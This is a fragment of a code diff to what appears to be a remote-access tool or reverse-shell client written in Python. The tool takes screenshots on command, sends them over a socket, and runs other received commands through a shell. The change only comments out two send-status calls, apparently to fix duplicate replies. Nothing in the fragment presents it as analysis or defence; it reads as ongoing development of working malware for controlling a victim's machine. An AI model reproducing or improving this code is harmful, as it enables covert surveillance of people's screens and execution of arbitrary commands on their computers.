@@ -190,10 +190,10 @@ def handle_screenshot():
             s.sendall(image_data)
             
             # Send final status
-            reliable_send({
-                'success': True,
-                'message': 'Screenshot data sent successfully'
-            })
+            # reliable_send({
+            #     'success': True,
+            #     'message': 'Screenshot data sent successfully'
+            # })
             
             return {'success': True, 'message': message}
             
@@ -252,7 +252,7 @@ def shell():
             elif command == 'screenshot':
                 print("[*] Taking screenshot...")
                 response = handle_screenshot()
-                reliable_send(response)
+                # reliable_send(response)
             else:
                 print(f"[*] Executing: {command}")
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
